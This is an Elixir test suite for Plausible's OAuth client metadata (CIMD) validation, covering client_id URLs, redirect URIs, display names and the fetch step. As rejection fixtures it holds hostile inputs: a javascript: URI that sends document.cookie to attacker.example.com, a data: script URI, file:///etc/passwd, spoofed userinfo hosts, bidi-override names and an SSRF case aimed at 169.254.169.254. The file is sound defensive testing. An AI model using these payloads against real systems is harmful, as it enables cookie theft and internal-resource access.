defmodule Plausible.OAuth.CIMDTest do
  use ExUnit.Case, async: true
  use Plausible.Test.Support.DNS

  alias Plausible.OAuth.CIMD

  @client_id "https://client.example.com/oauth-metadata"
  @redirect_uri "https://client.example.com/callback"

  describe "validate_client_id/1" do
    test "accepts an https URL with a path component" do
      for client_id <- [
            @client_id,
            "https://client.example.com/",
            "https://client.example.com/.well-known/oauth-client.json",
            @client_id <> String.duplicate("a", 2048 - byte_size(@client_id))
          ] do
        assert :ok = CIMD.validate_client_id(client_id)
      end
    end

    test "rejects a client_id that is not https" do
      for client_id <- ["http://client.example.com/meta", "/oauth-metadata", nil] do
        assert {:error, :client_id_not_https} = CIMD.validate_client_id(client_id)
      end
    end

    test "rejects userinfo, a fragment, a missing path or dot segments" do
      for client_id <- [
            "https://client.example.com@evil.example/meta",
            "https://user:pass@evil.example/meta",
            @client_id <> "#frag",
            @client_id <> "#",
            "https://client.example.com",
            "https://client.example.com?a=b",
            "https://client.example.com/a/../meta",
            "https://client.example.com/./meta",
            "https://client.example.com/meta/..",
            "https://client.example.com/%2e%2e/meta",
            "https://client.example.com/.%2E/meta"
          ] do
        assert {:error, :invalid_client_id} = CIMD.validate_client_id(client_id)
      end
    end

    test "rejects a client_id past the length limit" do
      client_id = @client_id <> String.duplicate("a", 2049 - byte_size(@client_id))

      assert {:error, :client_id_too_long} = CIMD.validate_client_id(client_id)
    end
  end

  describe "validate_document/2" do
    test "accepts a document that passes every rule" do
      doc = %{
        "client_id" => @client_id,
        "redirect_uris" => [@redirect_uri],
        "client_name" => "Claude"
      }

      assert :ok = CIMD.validate_document(doc, @client_id)
    end

    test "returns the first rule the document fails" do
      doc = %{"client_id" => @client_id, "redirect_uris" => [@redirect_uri]}

      assert {:error, :client_id_mismatch} =
               CIMD.validate_document(doc, "https://client.example.com/other")

      assert {:error, :missing_redirect_uris} =
               CIMD.validate_document(Map.delete(doc, "redirect_uris"), @client_id)

      assert {:error, :invalid_redirect_uris} =
               CIMD.validate_document(%{doc | "redirect_uris" => ["javascript:x"]}, @client_id)

      assert {:error, :invalid_client_name} =
               CIMD.validate_document(Map.put(doc, "client_name", ""), @client_id)
    end
  end

  describe "validate_self_reference/2" do
    test "requires the document to name the URL it came from" do
      assert :ok = CIMD.validate_self_reference(%{"client_id" => @client_id}, @client_id)

      assert {:error, :client_id_mismatch} =
               CIMD.validate_self_reference(
                 %{"client_id" => "https://evil.example/meta"},
                 @client_id
               )

      assert {:error, :client_id_mismatch} = CIMD.validate_self_reference(%{}, @client_id)
    end
  end

  describe "validate_redirect_uris/1" do
    test "accepts the redirect_uri shapes RFC 8252 section 7 defines" do
      for uri <- [
            @redirect_uri,
            "http://127.0.0.1:1234/callback",
            "http://localhost/callback",
            "http://[::1]:8080/callback",
            "com.example.app:/oauth2redirect",
            "https://client.example.com/" <> String.duplicate("a", 2048 - 27)
          ] do
        assert :ok = CIMD.validate_redirect_uris([uri])
      end
    end

    test "requires a non-empty list" do
      for redirect_uris <- [nil, [], @redirect_uri, 42] do
        assert {:error, :missing_redirect_uris} = CIMD.validate_redirect_uris(redirect_uris)
      end
    end

    test "rejects entries that are not usable targets" do
      for uri <- [
            "javascript:fetch('https://attacker.example.com/'+document.cookie)",
            "data:text/html,<script>alert(1)</script>",
            "vbscript:msgbox",
            "file:///etc/passwd",
            "http://client.example.com/callback",
            "https://user:pass@client.example.com/callback",
            "https://client.example.com/callback#frag",
            "/callback",
            "",
            42,
            "https://client.example.com/" <> String.duplicate("a", 2049 - 27)
          ] do
        assert {:error, :invalid_redirect_uris} = CIMD.validate_redirect_uris([uri])
      end
    end

    test "rejects the whole list when any one entry is unusable" do
      assert {:error, :invalid_redirect_uris} =
               CIMD.validate_redirect_uris([@redirect_uri, "javascript:alert(1)"])
    end
  end

  describe "validate_client_name/1" do
    test "accepts an absent name, non-ASCII text and internal spaces" do
      for name <- [nil, "Claude Code", "Café Auswärts", "分析クライアント", String.duplicate("N", 255)] do
        assert :ok = CIMD.validate_client_name(name)
      end
    end

    test "rejects a blank, over-long or non-string name" do
      for name <- [42, %{"en" => "Client"}, "", "   ", "\t\n", String.duplicate("N", 256)] do
        assert {:error, :invalid_client_name} = CIMD.validate_client_name(name)
      end
    end

    # Control characters truncate the consent screen's identity line, bidi
    # overrides and isolates reorder the glyphs around them.
    test "rejects a name carrying control or bidi characters" do
      for name <- [
            "Claude\u0000 Code",
            "Claude\nCode",
            "Claude\u007FCode",
            "Claude\u009BCode",
            "Claude\u202ACode",
            "Claude\u202ECode",
            "Claude\u2066Code",
            "Claude\u2069Code"
          ] do
        assert {:error, :invalid_client_name} = CIMD.validate_client_name(name)
      end
    end
  end

  describe "redirect_uri_registered?/2" do
    test "requires an exact match for non-loopback URIs" do
      assert CIMD.redirect_uri_registered?(@redirect_uri, [@redirect_uri])

      for requested <- ["https://client.example.com/other", @redirect_uri <> "?x=1", nil] do
        refute CIMD.redirect_uri_registered?(requested, [@redirect_uri])
      end
    end

    for loopback <- ["127.0.0.1", "[::1]", "localhost", "LOCALHOST"] do
      test "allows port mismatch for loopback URIs with #{loopback}" do
        assert CIMD.redirect_uri_registered?("http://#{unquote(loopback)}:4000/callback", [
                 "http://#{unquote(loopback)}:1000/callback"
               ])
      end

      test "allows undeclared port for loopback URIs with #{loopback}" do
        assert CIMD.redirect_uri_registered?("http://#{unquote(loopback)}:4000/callback", [
                 "http://#{unquote(loopback)}/callback"
               ])
      end
    end

    test "requires an exact match on every loopback component but the port" do
      registered = ["http://127.0.0.1:1234/callback?a=1"]

      assert CIMD.redirect_uri_registered?("http://127.0.0.1:9999/callback?a=1", registered)

      for requested <- [
            "http://127.0.0.1:9999/other?a=1",
            "http://127.0.0.1:9999/callback?a=2",
            "http://127.0.0.1:9999/callback",
            "http://127.0.0.1:9999/callback?a=1#frag",
            "http://evil@127.0.0.1:9999/callback?a=1",
            "https://127.0.0.1:9999/callback?a=1",
            "http://localhost:9999/callback?a=1"
          ] do
        refute CIMD.redirect_uri_registered?(requested, registered)
      end
    end

    test "ignores capitalisation of the scheme and host" do
      assert CIMD.redirect_uri_registered?("HTTP://LOCALHOST:1/callback", [
               "http://localhost:2/callback"
             ])

      assert CIMD.redirect_uri_registered?("http://localhost:1/callback", [
               "http://LOCALHOST:2/callback"
             ])
    end

    test "does not ignore capitalisation of the path" do
      refute CIMD.redirect_uri_registered?("http://localhost:1/CALLBACK", [
               "http://localhost:2/callback"
             ])
    end

    test "port must match for https scheme URIs" do
      refute CIMD.redirect_uri_registered?("https://client.example.com:443/callback", [
               "https://client.example.com/callback"
             ])
    end
  end

  describe "fetch/1" do
    setup do
      stub_dns()
      :ok
    end

    defp stub_metadata(doc) when is_map(doc), do: stub_body(JSON.encode!(doc))

    defp stub_body(body, status \\ 200) do
      Req.Test.stub(Plausible.OAuth.CIMD, fn conn ->
        Plug.Conn.send_resp(conn, status, body)
      end)
    end

    test "returns the document it fetched, verbatim" do
      doc = %{"client_id" => @client_id, "redirect_uris" => [@redirect_uri]}
      stub_metadata(doc)

      assert {:ok, ^doc} = CIMD.fetch(@client_id)
    end

    test "fetches the document from the client_id URL, pinning the Host header" do
      Req.Test.stub(Plausible.OAuth.CIMD, fn conn ->
        assert {"host", "client.example.com"} in conn.req_headers
        assert conn.request_path == "/oauth-metadata"

        Plug.Conn.send_resp(
          conn,
          200,
          JSON.encode!(%{"client_id" => @client_id, "redirect_uris" => [@redirect_uri]})
        )
      end)

      assert {:ok, _doc} = CIMD.fetch(@client_id)
    end

    test "refuses an unusable client_id without resolving or fetching it" do
      expect_no_dns_lookup()
      Req.Test.stub(Plausible.OAuth.CIMD, fn _conn -> raise "should never be called" end)

      assert {:error, :client_id_not_https} = CIMD.fetch("http://client.example.com/meta")

      assert {:error, :invalid_client_id} =
               CIMD.fetch("https://client.example.com@evil.example/meta")

      assert {:error, :client_id_too_long} = CIMD.fetch(@client_id <> String.duplicate("a", 2048))
    end

    test "refuses a document that does not validate against the URL it came from" do
      stub_metadata(%{
        "client_id" => "https://attacker.example.com/meta",
        "redirect_uris" => [@redirect_uri]
      })

      assert {:error, :client_id_mismatch} = CIMD.fetch(@client_id)
    end

    test "rejects a response that is not a JSON object" do
      stub_body("not json")
      assert {:error, :invalid_client_metadata} = CIMD.fetch(@client_id)

      stub_body("[]")
      assert {:error, :invalid_client_metadata} = CIMD.fetch(@client_id)
    end

    test "rejects a non-200 response" do
      stub_body("", 404)
      assert {:error, :client_metadata_unavailable} = CIMD.fetch(@client_id)
    end

    test "refuses to buffer an oversized document" do
      stub_body(String.duplicate("a", 1_000_001))
      assert {:error, :client_metadata_too_large} = CIMD.fetch(@client_id)
    end

    test "propagates a DNS resolution failure" do
      stub_dns(%{"client.example.com" => {[], []}})
      assert {:error, :dns_resolution_failed} = CIMD.fetch(@client_id)
    end

    test "refuses a client_id resolving to a restricted address, without fetching it" do
      stub_dns(%{"client.example.com" => {[{169, 254, 169, 254}], []}})
      Req.Test.stub(Plausible.OAuth.CIMD, fn _conn -> raise "should never be called" end)

      assert {:error, :restricted_address} = CIMD.fetch(@client_id)
    end
  end
end
